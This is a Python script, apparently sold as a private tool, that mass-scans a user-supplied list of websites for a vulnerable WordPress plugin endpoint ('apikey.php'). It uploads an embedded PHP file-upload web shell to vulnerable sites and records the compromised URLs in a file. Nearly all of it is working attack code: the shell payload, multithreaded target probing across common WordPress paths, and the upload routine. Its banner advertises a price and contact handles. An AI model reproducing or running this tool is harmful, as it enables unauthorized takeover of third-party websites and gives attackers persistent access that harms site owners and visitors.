# -*- coding: utf-8 -*
from __future__ import unicode_literals
#!/usr/bin/python
import requests, re, urllib2, os, sys, codecs, random               
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time                     
from platform import system 
from colorama import Fore                               
from colorama import Style                              
from pprint import pprint                               
from colorama import init
from urlparse import urlparse
import warnings

from bs4 import BeautifulSoup
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
fr  =   Fore.RED                                            
fc  =   Fore.CYAN                                           
fw  =   Fore.WHITE                                            
fg  =   Fore.GREEN                                            
sd  =   Style.DIM                                            
sn  =   Style.NORMAL                                        
sb  =   Style.BRIGHT 
shell = """<title>HRTN</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; } } ?>"""
def logo():
    curlear = "\x1b[0m"
    colors = [32]

    x = """
	
    ██   ██ ██████  ████████ ███    ██     ██    ██  ██     ██████  
    ██   ██ ██   ██    ██    ████   ██     ██    ██ ███    ██  ████ 
    ███████ ██████     ██    ██ ██  ██     ██    ██  ██    ██ ██ ██ 
    ██   ██ ██   ██    ██    ██  ██ ██      ██  ██   ██    ████  ██ 
    ██   ██ ██   ██    ██    ██   ████       ████    ██ ██  ██████  
                                                                    
                                                                    

Script : Bot auto exploiter and upload shell 2022 
HrTn v1 [Python] [ Private exploit auto upolad shell auto] (100$)						
			[ c0d3d BY Hrtn ]
					                                                                                                                                                                                                          

      \033[0;37;41m[icq:@HRTN98 telegram:@HRTN98
      tool is not free & only for the first 10 buyers]
    \033[0;37;41m[Not responsible for any illegal usage of this tool.]
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, curlear))
        time.sleep(0.05)
logo()
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
start_raw = raw_input("\n\033[91m\033[97mYour List: \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:

    with codecs.open(start_raw, mode='r', encoding='ascii', errors='ignore') as f:
        lists = f.read().splitlines()
        lists = list((lists))
except:
    print("open your eyes!")

shell_name = str(time.time())[:-3]
filenamex = "up"+str(shell_name)+".php?HRTN"
class Master:
    def unitrev(self, url, path, line):
        try:
            cek = requests.get(url + path+'/wp-content/plugins/apikey/apikey.php?test=hello' ,headers=Headers,timeout=5 ,verify=False)
            if 'testtrue' in cek.text or 'testtrue' in cek.content:
                open('Shellz.txt', 'a').write(url + path+'/wp-content/plugins/apikey/apikey.php?test=hello' )
                print( '{}#| {} {}   -  {}{}  Vuln  ({}) {}{} Shell Uploaded  '.format(sb, sd, url, fc,fc, line, sb,fg))
                try:

                    jfiler = {'filename' : (filenamex, shell)}
                    gerjre = requests.post(url + path+'/wp-content/plugins/apikey/apikey.php' ,files=jfiler ,headers=Headers ,timeout=15 ,verify=False)
                    if 'True' in gerjre.text:
                            open('Shellz.txt', 'a').write(url + path+'/wp-content/plugins/apikey/'+filenamex + '\n') 
                            print( '{}#| {} {}   -  {}{}  Vuln   {}{} Shell Uploaded  '.format(sb, sd, url, fc,fc, sb,fg))
                            sys.exit()
                    else:
                            print ('{}#| {} {}   -  {}{}  Vuln   {}{} Shell Uploaded  '.format(sb, sd, url, fc,fc, sb,fg))

                except Exception as e:
                   open('Shellz.txt', 'a').write(url + path+'/wp-content/plugins/apikey/'+filenamex + '\n') 
                   print ('{}#| {} {}   -  {}{}  Vuln   {}{} Shell Uploaded  '.format(sb, sd, url, fc,fc, sb,fg))
                   sys.exit()
            else:
                print( '{}#| {} {}   - {}{}  Not Vuln  ({}) {}{} Failed :(  '.format(sb, sd, url, fc,fc, line, sb,fr))


        except:
            open('shellz.txt', 'a').write(url +'/'+filenamex + '\n')   
            print( '{}#| {} {}   -  {}{}  Vuln   {}{} Shell Uploaded  '.format(sb, sd, url, fc,fc, sb,fg))
            sys.exit()

BotMaster = Master()

def Exploit(url):
    try:
        if 'http' not in url:
            site = 'http://'+url
            url = 'http://'+url
            pathcfg = {'/','/wordpress','/wp','/blog','/new','test','/old','/backup'}
            lines = 0
            for i in pathcfg:
                lines += 1
                BotMaster.unitrev(url,i, lines)

        else:
            site = url
            pathcfg = {'/','/wordpress','/wp','/blog','/new','test','/old','/backup'}
            lines = 0
            for i in pathcfg:
                lines += 1
                BotMaster.unitrev(url,i, lines)

    except:
        pass

def Main():
    try:
        pp = Pool(int(crownes))
        pr = pp.map(Exploit, lists)
    except:
        pass


if __name__ == '__main__':
    Main()
